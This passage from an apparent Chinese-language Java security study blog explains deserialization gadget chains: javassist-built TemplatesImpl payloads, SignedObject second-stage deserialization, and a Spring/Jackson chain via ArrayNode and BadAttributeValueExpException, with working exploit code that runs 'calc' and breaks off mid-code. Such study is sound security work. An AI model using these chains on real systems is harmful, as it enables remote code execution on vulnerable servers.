<p>但用 javassist 就能省去这些不必要的东西，直接将其生成一个 class 文件，使 payload 变短，最终代码如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">DoubleExp</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtNewConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Javassist_Make_Shell</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token class-name">CtNewConstructor</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public A()&#123;Runtime.getRuntime().exec(\"calc\");&#125;"</span><span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731225067978-416635c9-c219-4b26-9883-35153aa2c2b8.png"></p>
<p>能直接从 2000 多变到 1000 多。<br>更多讲解：<br><a href="https://xz.aliyun.com/t/12768?time__1311=GqGxu7G=oYqCqGN4eewuiDgQQjjdOY+bD">Java反序列化之ROME反序列化 - 先知社区</a></p>
<p><a href="https://goodapple.top/archives/1145">Java安全学习——ROME反序列化 - 枫のBlog</a></p>
<h2 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h2><p>二次反序列化，故名思意，就是将已经反序列化后的数据再反序列化一次，主要目的是用来绕过黑名单的</p>
<h3 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h3><p>这是一个 java.security 下的一个用于创建真实运行时对象的类，更具体的说，SignedObject 包含另一个 Serializable 对象。</p>
<p>反序列化的内容可控：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731407519796-be746d62-b6a0-4fe1-af20-30c9c4d20dfb.png"></p>
<p>序列化的内容也可控：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731407606590-40b204a1-7461-4be8-9910-d9948698adf3.png"></p>
<p>所以我们可以构建恶意类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">KeyPairGenerator</span> kpg <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">KeyPair</span> kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">SignedObject</span> signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>恶意对象 用于第二次反序列化<span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Signature</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后调用 getObject 方法，便能成功触发序列化和反序列化，现在就只差一个来调用 getObject 方法的类就行</p>
<h3 id="rome-的利用"><a href="#rome-的利用" class="headerlink" title="rome 的利用"></a>rome 的利用</h3><h2 id="Spring-jackson-原生链触发反序列化"><a href="#Spring-jackson-原生链触发反序列化" class="headerlink" title="Spring-jackson 原生链触发反序列化"></a>Spring-jackson 原生链触发反序列化</h2><p>Jackson 类是 Spring-boot 中自带的一个类，当存在 spring 类的时候就会存在 jackson 类，在这个类中，除了正常的 通过注解来进行反序列化，我们还能通过调用任意 getter 来进行反序列化。</p>
<p>在 jackson 中，序列化 json 字符串主要是通过 ObjectMapper#writeValueAsString 方法来进行调用 getter 的</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731756352888-2b4b5ffb-85c2-427e-93c5-ec7249f7c8b2.png"></p>
<p>随便写一段代码来调试下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonProcessingException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token comment">// 构造函数</span>
    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// Getter和Setter</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 主方法，用于测试序列化</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">JsonProcessingException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 创建一个Person对象</span>
        <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"John"</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建ObjectMapper实例</span>
        <span class="token class-name">ObjectMapper</span> objectMapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 序列化为JSON字符串</span>
        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 输出JSON字符串</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>断点下在 40 行，大致堆栈如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">serializeAsField<span class="token operator">:</span><span class="token number">688</span><span class="token punctuation">,</span> <span class="token class-name">BeanPropertyWriter</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ser<span class="token punctuation">)</span>
serializeFields<span class="token operator">:</span><span class="token number">770</span><span class="token punctuation">,</span> <span class="token class-name">BeanSerializerBase</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ser<span class="token punctuation">.</span>std<span class="token punctuation">)</span>
serialize<span class="token operator">:</span><span class="token number">178</span><span class="token punctuation">,</span> <span class="token class-name">BeanSerializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ser<span class="token punctuation">)</span>
_serialize<span class="token operator">:</span><span class="token number">480</span><span class="token punctuation">,</span> <span class="token class-name">DefaultSerializerProvider</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ser<span class="token punctuation">)</span>
serializeValue<span class="token operator">:</span><span class="token number">319</span><span class="token punctuation">,</span> <span class="token class-name">DefaultSerializerProvider</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ser<span class="token punctuation">)</span>
_writeValueAndClose<span class="token operator">:</span><span class="token number">4487</span><span class="token punctuation">,</span> <span class="token class-name">ObjectMapper</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">)</span>
writeValueAsString<span class="token operator">:</span><span class="token number">3742</span><span class="token punctuation">,</span> <span class="token class-name">ObjectMapper</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">)</span>
main<span class="token operator">:</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token class-name">Person</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>demos<span class="token punctuation">.</span>web<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先我们进入到的就是writeValueAsString:3742, ObjectMapper 这个方法，这个方法先创建了一个<code>SegmentedStringWriter</code> 对象  ，用于将字符写入缓冲区，然后调用 _writeValueAndClose 方法进行序列化。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731758127728-9e577a6f-888e-4498-915f-10f0b2f8021d.png"></p>
<p>然后进入到_writeValueAndClose:4487, ObjectMapper 的这个方法中进行反序列化，在这个方法中我们会通过 <code>_serializerProvider(cfg)</code> 获取一个序列化提供者，这个对象负责执行序列化操作。<code>serializeValue(g, value)</code> 会将 <code>value</code> 序列化为 JSON，并通过 <code>JsonGenerator g</code> 写入 JSON 数据。  </p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731758236055-c7020363-7c6a-4622-aa25-b799b291c12d.png"></p>
<p>然后就到了 serializeValue:319, DefaultSerializerProvider 这个方法中，这个方法先判断传入的值是否为空，不为空就 通过 <code>value.getClass()</code> 获取传入对象的运行时类型（<code>Class</code> 对象）， 调用 <code>findTypedValueSerializer(cls, true, null)</code> 来查找适用于该对象类型 <code>cls</code> 的序列化器 ， 获取配置中定义的根名称。如果没有特别指定，通常会使用类的默认名称 ， 如果没有启用根包装，且没有显式指定根名称，最后调用 <code>_serialize</code> 方法进行常规序列化，将对象直接转换为 JSON 格式并输出  。<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731758310093-73b0d495-d9c1-4be9-9cd9-1371c70b52ff.png"></p>
<p>然后到_serialize:480, DefaultSerializerProvider 这个方法，这里经过了好几个同名方法的判断，最总跳到了这个方法中，这段是判断它有没有对象表示符，没有则直接序列化，又则，跟据他的逻辑进行序列化</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731760552145-3ee39607-354b-4cd4-bae0-8fc1a9fb6512.png"></p>
<p>然后就到了serializeFields:770, BeanSerializerBase 这个方法中，这个方法是进行检索存储的信息后调用 serializeAsField  来进行序列化。<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731760935981-d4ef2cec-683e-45f1-a683-f1bec0c9d60f.png"></p>
<p>最后跟进到serializeAsField:688, BeanPropertyWriter 这个方法中，在这里实现的最终的序列化，这里能通过反射获取你序列化的类的方法的值。<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731761117560-e449f801-ef46-4875-b21a-b7af5b2e40fe.png"></p>
<p>到此整个序列化流程就算是结束。所以现在已经很清楚了，我们能反射获取我们序列化的类的任意 getter 方法，所以，现在我们只要能控制其序列化的类，成为我们的恶意类，这条链子就完整的出现了。在之前我们的templatesImpl 类中存在一个 getOutputProperties 能够是实现任意恶意类加载，现在只需要一个 readObject 来触发就成功了。</p>
<p>ArrayNode 是 JSON 库中的类，用于表示JSON数组。继承了祖先类BaseJsonNode，而BaseJsonNode重写了toString方法</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731762430319-5b18da85-faaf-400d-97f8-883c4a4ca50e.png"></p>
<p>该toString会把json数组中的每一个对象执行JSON序列化，返回String类型，然后在而BadAttributeValueExpException的readObject方法中，可以执行一个可控对象的toString。</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731762525926-41f41791-6067-474d-9476-1ee19b913420.png"></p>
<p>到现在，一个完整的链就出来了：通过 hashmap 调用BadAttributeValueExpException 的 readObject，触发BaseJsonNode 的 toString，进行 jackson 的序列化，触发调用我们序列的的恶意类中的 getter 方法，我们再传入templatesImpl 的 getter 方法来实现任意恶意类加载，就能成功执行命令。代码如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>demos<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span></span><span class="token class-name">ArrayNode</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span></span><span class="token class-name">BaseJsonNode</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span></span><span class="token class-name">BinaryNode</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtNewConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonPayload</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.example.jackson.demos.web.Calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc2 <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>cc2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token class-name">CtNewConstructor</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public A()&#123;Runtime.getRuntime().exec(\"calc\");&#125;"</span><span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cc<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bttes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> templateImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templateImpl<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templateImpl<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span>bttes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templateImpl<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        templateImpl<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectMapper</span> objmapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ArrayNode</span> arrayNode <span class="token operator">=</span>objmapper<span class="token punctuation">.</span><span class="token function">createArrayNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        arrayNode<span class="token punctuation">.</span><span class="token function">addPOJO</span><span class="token punctuation">(</span>templateImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> badAttributeValueExpException<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span>arrayNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"set23.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"set23.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span>  <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token class-name">T</span> f<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> filed <span class="token operator">=</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        filed<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
